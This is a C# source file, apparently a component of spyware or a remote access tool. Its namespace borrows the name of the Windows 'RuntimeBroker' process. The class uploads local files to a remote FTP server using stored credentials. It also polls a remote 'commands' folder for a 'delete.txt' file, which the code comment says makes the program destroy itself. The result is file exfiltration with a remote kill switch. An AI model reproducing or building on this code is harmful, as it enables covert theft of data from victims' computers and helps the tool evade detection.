using System;
using System.IO;
using System.Net;
using System.Text;

namespace RuntimeBroker
{
    internal class _ftp
    {
        internal void upload(Main instance, String filename, String file)
        {
            FtpWebRequest request = (FtpWebRequest) WebRequest.Create(new Uri("ftp://" + instance.ip + "/" + filename));
            request.Credentials = new NetworkCredential(instance.credts[0], instance.credts[1]);
            request.Method = WebRequestMethods.Ftp.UploadFile;
            byte[] fileContents;
            using (StreamReader sourceStream = new StreamReader(file))
            {
                fileContents = Encoding.UTF8.GetBytes(sourceStream.ReadToEnd());
            }
            request.ContentLength = fileContents.Length;
            using (Stream requestStream = request.GetRequestStream())
            {
                requestStream.Write(fileContents, 0, fileContents.Length);
            }
        }
        internal Boolean check(Main instance)
        {
            //checking if FTP contains folder "delete". If yes, program will destroy itself.
            FtpWebRequest request = (FtpWebRequest) WebRequest.Create(new Uri("ftp://" + instance.ip + "/commands/"));
            request.Credentials = new NetworkCredential(instance.credts[0], instance.credts[1]);
            request.Method = WebRequestMethods.Ftp.ListDirectory;
            FtpWebResponse response = (FtpWebResponse) request.GetResponse();
            StreamReader reader = new StreamReader(response.GetResponseStream());
            String line = reader.ReadLine();
            while(!String.IsNullOrEmpty(line)){
                if(!line.Contains("delete.txt"))
                {
                    line = reader.ReadLine();
                }else
                {
                    reader.Close();
                    return true;
                }
            }
            return false;
        }
    }
}